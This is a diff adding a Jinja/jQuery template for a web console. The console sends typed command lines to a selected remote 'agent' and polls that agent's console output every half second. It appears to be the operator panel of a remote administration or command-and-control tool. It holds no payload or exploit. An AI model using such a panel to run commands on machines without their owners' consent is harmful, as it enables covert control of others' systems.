@@ -1,0 +1,46 @@
+{% with previous_page=url_for('webui.agent_list'), title=agent.display_name %}
+{% include "header.html" %}
+{% endwith %}
+
+<div class="container"> 
+<section id="main_content">
+    
+    <span id="terminal">
+    </span>
+
+    <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width: 50%" />
+    <button type="submit" onclick="send_command()">Send</button>
+
+    <script>
+    function keypressed(e){
+        if(e.keyCode === 13){
+        send_command();
+        }
+        return false;
+    }
+    function send_command(e) {
+        $.post("{{ url_for('api.push_command', agent_id=agent.id) }}", {'cmdline': $('#cmd').val()});
+        $('#cmd').val('');
+        return false;
+    }
+    function refresh_term() {
+        var termdiv = $('#termtext');
+        if (!$('#terminal').is(':hover')) {
+            $('#terminal').load("{{ url_for('webui.agent_console', agent_id=agent.id) }}", '' , 
+            function() {
+                var termdiv = document.getElementById('termtext');
+                termdiv.scrollTop = termdiv.scrollHeight;
+            });
+        }
+    }
+
+    $(document).ready(function(){
+        setInterval(refresh_term, 500);
+    });
+
+    </script>
+
+</section>
+</div>
+
+{% include "footer.html" %}
